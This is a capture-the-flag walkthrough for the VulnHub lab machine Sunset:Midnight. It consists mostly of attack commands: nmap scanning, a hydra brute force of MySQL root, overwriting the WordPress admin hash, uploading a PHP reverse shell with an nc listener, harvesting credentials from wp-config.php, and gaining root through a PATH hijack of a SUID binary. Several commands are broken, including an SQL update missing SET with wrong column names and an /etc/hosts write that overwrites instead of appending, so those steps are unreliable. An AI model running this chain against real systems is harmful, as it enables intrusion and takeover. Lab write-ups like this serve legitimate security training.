


# Sunset:Midnight Walkthrough 

**VulnHub Link:** [Sunset:Midnight](https://www.vulnhub.com/entry/sunset-midnight,517/)
**Difficulty:** Easy
**Release Date:** 19 Jul 2020


## 1.Reconnaissance

nmap -A -O -T4 -P -sV 192.168.100.153


## 2.Web Enumeration

whatweb http://192.168.100.153


sudo echo "192.168.100.153    sunset-mignight" > /etc/hosts

## 3.Brute Forcing

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.100.153 -I
```

robert found

```bash
mysql -h 192.168.100.153 -u root -p
```

we saw that we cant crack hashes of wp_users who is admin
we generate a hash from hash generator websites

and then ---->
```bash
use wordpress_db;
update wp_users password="<hash>" where user='admin';
```

we can login to wordpress site which we generate before 

we upload reverse_shell.php in plugins page

then open /wp-content/uploads/2025/reverse_shell.php

Warning: listen before executing shell payload ..!
```bash
rlwrap nc -nvlp 1234
```

then we got www-data shell.

in /var/www/html/wordpress/wp-config.php , we got jose password

after gaining jose shell

## 4.Privilege Escalation

```bash
find / -perm /4000 2>/dev/null
```

we observe that /usr/bin/status has suid byte

```bash
strings /usr/bin/status
echo "/bin/sh" > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/usr/bin/status
```

and BINGO ..! We got ROOT shell Successfully....!


